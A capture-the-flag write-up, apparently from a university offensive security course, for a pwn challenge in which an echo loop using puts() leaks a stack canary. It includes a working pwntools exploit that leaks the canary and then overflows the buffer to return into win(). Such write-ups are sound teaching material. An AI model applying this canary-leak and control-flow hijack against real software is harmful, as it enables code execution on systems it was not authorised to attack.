# Parrot Cage

**Category:** pwn / canary leak via echo primitive · **Course:** Offensive Security (PoliTo)

## Challenge

"Polly" echoes back every line sent to it with `puts(buf)` in a loop, until the message `bye`. A `win()` that prints `$FLAG` from the environment exists but is never called.

## Vulnerability

`read(STDIN_FILENO, buf, 0x200)` into a 64-byte buffer overflows the canary — but instead of brute-forcing it blind, this challenge is solved with a leak. Since Polly echoes the buffer back with `puts()`, sending exactly one byte past the canary's first (null) byte makes `puts()` keep printing — right through the non-null remainder of the canary — before hitting the next null terminator.

## Exploitation

1. Send `canary_offset + 1` = 73 bytes of `A`. That extra byte overwrites the canary's low (null) byte, so when `puts()` echoes the buffer it runs straight on into the canary's remaining 7 bytes until the next null.
2. Consume the echoed padding with `recvuntil(payload)`, then `recv(7)` to grab those 7 bytes and reassemble the full canary as `b"\x00" + leak`.
3. Send the real overflow with the correct canary, saved-RBP filler, a `ret` gadget for alignment, and `win()`.
4. Send `bye` so the loop exits cleanly into the return that now points at `win()`.

As in `solve.py`:

```python
canary_offset = 72
return_offset = 88
return_rop    = 0x40101a

# --- leak the canary through the echo ---
payload = b"A" * (canary_offset + 1)        # 73: one byte over the canary's NUL
p.send(payload)
p.recvuntil(payload)                         # consume the echoed A's
leak   = p.recv(7)                           # the 7 non-null canary bytes
canary = b"\x00" + leak                      # restore the leading NUL

# --- overflow with the recovered canary ---
payload = flat(
    b"A" * canary_offset,
    canary,
    b"B" * (return_offset - canary_offset - len(canary)),
    p64(return_rop),                         # ret gadget, stack alignment
    p64(elf.symbols.win),
)
p.send(payload)
p.sendline(b"bye")                           # break the loop -> return into win()
```

## Files

- `main.c` — challenge source
- `parrot_cage` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — `win()` prints the `FLAG` environment variable on the remote instance; redacted here per standard write-up etiquette.
